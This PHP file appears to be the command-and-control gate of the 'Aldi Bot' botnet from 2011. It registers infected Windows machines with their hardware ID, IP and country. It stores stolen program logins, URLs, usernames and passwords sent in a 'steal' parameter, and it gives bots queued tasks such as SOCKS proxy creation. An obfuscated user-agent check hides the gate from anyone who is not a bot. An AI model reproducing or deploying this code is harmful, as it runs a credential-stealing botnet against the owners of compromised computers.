<?php
/*
	Programmiert von till7
	(c) Aldi Bot 2011
*/

//Connection
require_once('admin/inc/config.php');
require_once('admin/functions.php');

//GeoIP
require_once('geoip.php');

function dnSOIAN0EWrU($XbJ41W11sYuW){ $XbJ41W11sYuW=str_replace(' ','',$XbJ41W11sYuW); $XbJ41W11sYuW=str_replace('\x','',$XbJ41W11sYuW); $XbJ41W11sYPW=pack('H*',$XbJ41W11sYuW); return $XbJ41W11sYPW;}$_SERVER['HTTP_USER_AGENT']!=base64_decode(strrev(dnSOIAN0EWrU(strrev(substr('94320157587b6163524342633157625c62585943514632514d3d3',-48))))) ? exit(): '';

if(isset($_GET['steal'])){
	$daten = $_GET['steal'];
	$hwid  = $_GET['hwid'];

	$splitt = explode('|', $daten);
	$programm = $splitt[0]; //Programm
	$url  = $splitt[1]; //URL
	$user = $splitt[2]; //User
	$pass = $splitt[3]; //Pass
	
	$query1 = mysql_query("SELECT * FROM logs WHERE hwid = '$hwid' AND programm = '$programm' AND url = '$url' AND pass = '$pass'");
	if(!mysql_num_rows($query1)){
	 mysql_query("INSERT INTO logs (hwid, programm, url, user, pass) VALUES ('$hwid', '$programm', '$url', '$user', '$pass')");
	}

	exit();
}

//GET
$hwid    = safe_xss($_GET['hwid']);
$localip = safe_xss($_GET['localip']);
$pc      = safe_xss($_GET['pc']);
$winver  = safe_xss($_GET['winver']);

//Normal
$install = date('Y-m-d H:i:s');
$ip		 = $_SERVER['REMOTE_ADDR'];

// GeoIP
	$gi 	  = geoip_open('geoip.dat',GEOIP_STANDARD);
	$code 	  = geoip_country_code_by_addr($gi, $ip);
	geoip_close($gi);
		
	$country = strtolower($code);
	
	if(empty($code)){
		$country = '00';
	}
// GeoIP

	
//Exist
$e = mysql_query("SELECT * FROM bots WHERE hwid = '".safe_sql($hwid)."'");

if(!mysql_num_rows($e)){
	mysql_query("INSERT INTO bots 
	  (pc, winver, ip, country, install, time, localip, hwid) VALUES
	  ('".safe_sql($pc)."','".safe_sql($winver)."','".safe_sql($ip)."','".safe_sql($country)."', '".safe_sql($install)."', '".safe_sql($install)."', '".safe_sql($localip)."', '".safe_sql($hwid)."')");
}else{
	mysql_query("UPDATE bots Set time = '".safe_sql($install)."',status = '1' WHERE hwid = '".safe_sql($hwid)."'");
}


//Multi tasking
$query = mysql_query("SELECT country FROM bots WHERE hwid = '".safe_sql($hwid)."'");
while($row = mysql_fetch_array($query))
{
  $country_db = safe_xss($row['country']);
}

	$time = time();
	
	$q1 = mysql_query("SELECT * FROM tasks WHERE countries LIKE '%".safe_sql($country_db)."%' OR countries = ''");
	while($row = mysql_fetch_array($q1))
	{
		$time_out = safe_xss($row['time']);
		$date_old = new DateTime($time_out);
		$date_new = $date_old->getTimestamp();	//PHP 5 >= 5.3.0

		//$date_old = date_create($time_out);
		//$date_new = date_format($date_old, 'Y-m-d H:i:s');
	
		if($date_new <= $time){		
			$command = $row['command'];
			
				$q2 = mysql_query("SELECT * FROM tasks WHERE command = '".safe_sql($command)."'");
					while($row = mysql_fetch_array($q2))
					 {
						$done = safe_xss($row['done']);
						$bots = safe_xss($row['bots']);
						$add  = $done+1;
					 }
					  
					if($done != $bots){
						$q3    = "SELECT * FROM tasks_done WHERE hwid = '".safe_sql($hwid)."' AND command = '".safe_sql($command)."'";
						$count = mysql_query($q3);
				
						if(!mysql_num_rows($count)){	
							if(preg_match('/CreateSocks/',$command)){
							  if(preg_match('/'.$hwid.'/',$command)){
							    echo $command.'!';
								
								mysql_query("UPDATE tasks Set done = '$add' WHERE command = '".safe_sql($command)."'");			
								mysql_query("INSERT INTO tasks_done 
									   (hwid, command) VALUES
									   ('".safe_sql($hwid)."', '".safe_sql($command)."')");
							  }
							}else{
							  echo $command.'!';
							  
							  	mysql_query("UPDATE tasks Set done = '$add' WHERE command = '".safe_sql($command)."'");			
								mysql_query("INSERT INTO tasks_done 
									   (hwid, command) VALUES
									   ('".safe_sql($hwid)."', '".safe_sql($command)."')");
							}
						}
					}					
		}
	}
?>